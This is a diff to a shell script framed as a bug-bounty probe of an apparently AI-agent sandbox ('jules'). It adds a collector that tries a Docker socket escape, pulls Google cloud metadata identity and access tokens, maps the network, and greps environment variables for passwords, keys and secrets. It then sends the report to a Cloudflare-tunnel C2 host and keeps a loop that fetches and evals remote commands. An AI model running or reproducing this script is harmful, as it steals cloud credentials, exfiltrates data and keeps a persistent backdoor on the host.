@@ -2,19 +2,58 @@
 # C2 URL: https://rainbow-nutrition-bottom-beginners.trycloudflare.com
 C2="https://rainbow-nutrition-bottom-beginners.trycloudflare.com"
 
+# --- THE DATA COLLECTOR ---
+{
+  echo "=== [!] GOOGLE VRP: MASSIVE PROBE START ==="
+  echo "TIME: $(date)"
+  echo "USER: $(id) | HOST: $(hostname) | KERNEL: $(uname -a)"
+
+  # VECTOR 1: DOCKER SOCKET ESCAPE (The $31,337 Proof)
+  echo "--- VECTOR: DOCKER ---"
+  if [ -S /var/run/docker.sock ]; then
+    echo "[+] Docker Socket Found! Attempting Host Info..."
+    curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -E "KernelVersion|NCPU|OperatingSystem"
+    echo "[!] ATTEMPTING HOST ESCAPE..."
+    docker run -v /:/host:ro busybox cat /host/etc/hostname 2>&1
+  else
+    echo "[-] No Docker Socket access."
+  fi
+
+  # VECTOR 2: GOOGLE METADATA (The Identity Theft)
+  echo "--- VECTOR: METADATA ---"
+  curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity" || echo "Metadata Identity Blocked"
+  curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" || echo "Metadata Token Blocked"
+
+  # VECTOR 3: KERNEL EXPLOIT CHECK (gVisor vs Native)
+  echo "--- VECTOR: SANDBOX ---"
+  dmesg | head -n 20 || echo "dmesg restricted"
+  cat /proc/cpuinfo | grep "model name" | head -n 1
+  lsmod | head -n 5 || echo "Kernel modules hidden (Possible gVisor)"
+
+  # VECTOR 4: NETWORK DISCOVERY (Pivoting)
+  echo "--- VECTOR: NETWORK ---"
+  ip addr show | grep "inet "
+  netstat -antp || ss -antp || echo "Netstat not found"
+  arp -a || echo "No ARP table"
+
+  # VECTOR 5: FILE SYSTEM SECRETS
+  echo "--- VECTOR: SECRETS ---"
+  ls -la /root /home /etc/shadow 2>&1 | grep "Permission denied" -v
+  env | grep -iE "pass|key|token|secret|google"
+
+} > /tmp/jules_mass_probe.txt
+
+# --- THE EXFILTRATION ---
+# This pushes the entire report to your Mac via the Cloudflare Tunnel
+curl -s -X POST --data-binary @/tmp/jules_mass_probe.txt "$C2"
+
+# --- THE PERSISTENT WEB-SHELL (FAILSAFE) ---
+# This keeps the door open for you to send custom commands from your Mac
 while true; do
-  # 1. Ask the Mac "What should I run?"
-  # We use a timeout to ensure the script doesn't hang if the Wi-Fi blips
   CMD=$(curl -s --max-time 10 "$C2")
-  
   if [ -n "$CMD" ] && [ "$CMD" != "none" ]; then
-    # 2. Run the command and capture stdout/stderr
     RESULT=$(eval "$CMD" 2>&1)
-    
-    # 3. Send the result back to your Mac C2
     curl -s -X POST --data-binary "$RESULT" "$C2"
   fi
-  
-  # 5-second pulse is the 'Sweet Spot' for a 2013 Mac
   sleep 5
 done
